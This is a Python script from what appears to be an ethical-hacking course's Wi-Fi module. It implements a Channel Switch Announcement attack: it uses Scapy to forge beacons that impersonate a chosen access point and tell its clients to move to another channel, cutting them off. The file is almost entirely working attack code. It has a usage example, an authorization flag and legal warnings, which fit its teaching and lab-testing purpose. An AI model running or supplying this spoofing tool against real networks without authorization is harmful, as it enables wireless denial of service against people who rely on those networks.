#!/usr/bin/env python3
"""
04_attacks/07_csa_attack.py — Channel Switch Announcement attack (move clients off-channel).

⚠  THIS IS AN ACTIVE ATTACK TOOL. It transmits spoofed beacons.
   It impersonates a real AP and lies to its clients about a channel change.
   Use ONLY on networks you own or are authorized to test.
   In Portugal: Lei 109/2009, Art. 7 — unauthorized interference → up to 3 years.

A CSA (Channel Switch Announcement) is the legitimate mechanism an AP uses to
say "I'm moving to channel X, follow me." It's a management-frame field — and
on networks without PMF it is unauthenticated, so anyone can forge it. We spoof
the target AP's beacons with a CSA element pointing at a channel where the real
AP isn't, and compliant clients dutifully switch and lose connectivity.

It's the quieter cousin of the deauth flood: instead of kicking clients, you
gently mislead them. Like 04_attacks/03_deauth.py, it does nothing against PMF-required
APs — confirm with 05_defense/04_pmf_detector.py first.

Usage:
    sudo python3 04_attacks/07_csa_attack.py --iface wlan1mon \\
        --bssid AA:BB:CC:DD:EE:FF --ssid Lab-Net \\
        --current-channel 6 --target-channel 1 --i-have-authorization

Requires: pip install scapy

CYBERS3C — Ethical Hacking Postgrad — Wi-Fi Module — Session 3
"""

import argparse
import sys

try:
    from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
except ImportError:
    print("[!] Scapy missing. pip install scapy")
    sys.exit(1)

# --- make wifi_utils (repo root) importable from any topic subfolder ---
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from wifi_utils import require_root, require_monitor_mode, add_iface_arg, validate_mac


def main():
    parser = argparse.ArgumentParser(
        description="Forge CSA beacons to push a target AP's clients to another channel.",
    )
    add_iface_arg(parser)
    parser.add_argument("--bssid", required=True, metavar="AA:BB:CC:DD:EE:FF",
                        help="BSSID of the AP to impersonate.")
    parser.add_argument("--ssid", required=True, help="SSID of that AP.")
    parser.add_argument("--current-channel", type=int, required=True, metavar="N",
                        help="Channel the real AP is on (where we transmit).")
    parser.add_argument("--target-channel", type=int, required=True, metavar="N",
                        help="Channel to herd clients toward.")
    parser.add_argument("--count", type=int, default=0, metavar="N",
                        help="Beacons to send (0 = loop until Ctrl-C). (default: 0)")
    parser.add_argument("--i-have-authorization", action="store_true",
                        help="Required. Confirms you are authorized to transmit.")
    args = parser.parse_args()

    if not args.i_have_authorization:
        print("[!] This tool transmits spoofed beacons. Pass --i-have-authorization")
        print("    to confirm you own or are authorized to test this network.")
        sys.exit(1)

    try:
        bssid = validate_mac(args.bssid)
    except ValueError as e:
        print(f"[!] {e}")
        sys.exit(1)

    require_root("04_attacks/07_csa_attack.py")
    require_monitor_mode(args.iface)

    # CSA element (tag 37): [switch mode, new channel, switch count]
    #   switch mode 1 = stop transmitting until the switch happens
    #   switch count = beacons remaining before the switch (1 = next one)
    csa = bytes([1, args.target_channel & 0xFF, 1])

    frame = (RadioTap()
             / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                     addr2=bssid, addr3=bssid)
             / Dot11Beacon(cap="ESS")
             / Dot11Elt(ID="SSID", info=args.ssid)
             / Dot11Elt(ID="DSset", info=chr(args.current_channel))
             / Dot11Elt(ID=37, info=csa))

    print(f"\n=== 04_attacks/07_csa_attack.py | iface={args.iface} ===")
    print(f"[*] Impersonating {bssid} ('{args.ssid}') on channel {args.current_channel}.")
    print(f"[*] Announcing switch → channel {args.target_channel}.")
    print(f"[!] Tip: put your card on channel {args.current_channel} so clients hear this.")
    print("[*] Transmitting. Ctrl-C to stop.\n")

    try:
        if args.count > 0:
            sendp(frame, iface=args.iface, count=args.count, inter=0.1)
            print(f"[+] Sent {args.count} CSA beacons.")
        else:
            sendp(frame, iface=args.iface, inter=0.1, loop=1)
    except KeyboardInterrupt:
        print("\n[+] Stopped.")


if __name__ == "__main__":
    main()
